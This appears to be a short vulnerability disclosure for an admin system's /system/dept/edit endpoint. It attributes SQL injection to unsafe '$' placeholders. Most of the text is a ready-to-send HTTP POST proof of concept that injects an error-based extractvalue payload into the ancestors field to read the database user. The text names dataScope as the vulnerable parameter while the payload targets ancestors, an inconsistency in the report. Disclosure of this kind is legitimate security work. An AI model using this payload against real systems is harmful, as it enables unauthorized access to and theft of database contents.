SQL injection exists in the dataScope parameter of the /system/dept/edit  interface of the system.  
The cause of this vulnerability is the use of the $ placeholder symbol.  
<img width="415" alt="image" src="https://github.com/biantaibao/octopus_SQL2/assets/131763503/469d1993-ebe2-41d1-bcae-e4abaf098265">  
Find the front-end interface of the interface, enter the department management menu, and click the edit button.  
<img width="414" alt="image" src="https://github.com/biantaibao/octopus_SQL2/assets/131763503/c521b738-6d27-4c07-953b-b42decde3a31">  
poc:  

POST /system/dept/edit HTTP/1.1  
Host: 127.0.0.1:9999  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0  
Accept: application/json, text/javascript, */*; q=0.01  
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
Accept-Encoding: gzip, deflate  
Content-Type: application/x-www-form-urlencoded; charset=UTF-8  
X-Requested-With: XMLHttpRequest  
Content-Length: 111  
Origin: http://127.0.0.1:9999  
Connection: close  
Referer: http://127.0.0.1:9999/system/dept/edit/104  
Cookie: Hm_lvt_f8cddee34ca21f05373a9388cfdd798b=1704968094; Hm_lvt_bfe2407e37bbaa8dc195c5db42daf96a=1705885425; _jpuid="MTY3ZTZkMDhmMDQ5ODc1MDgzNGZkYmUyNDk4NzBhMTYjMTcwNTg4ODcwODg0OSMxNzI4MDAjTVE9PQ=="  
Sec-Fetch-Dest: empty  
Sec-Fetch-Mode: cors  
Sec-Fetch-Site: same-origin  

DeptName=1&DeptId=100&ParentId=12&Status=0&OrderNum=1&ancestors=0)or(extractvalue(1,concat((select user()))));#   

Successfully viewed user.
![image](https://github.com/biantaibao/octopus_SQL2/assets/131763503/c06dafc5-c826-438c-9230-a2a188a677a1)  
![image](https://github.com/biantaibao/octopus_SQL2/assets/131763503/4fb2aee8-4f74-4f66-bc4d-c62024a647ef)



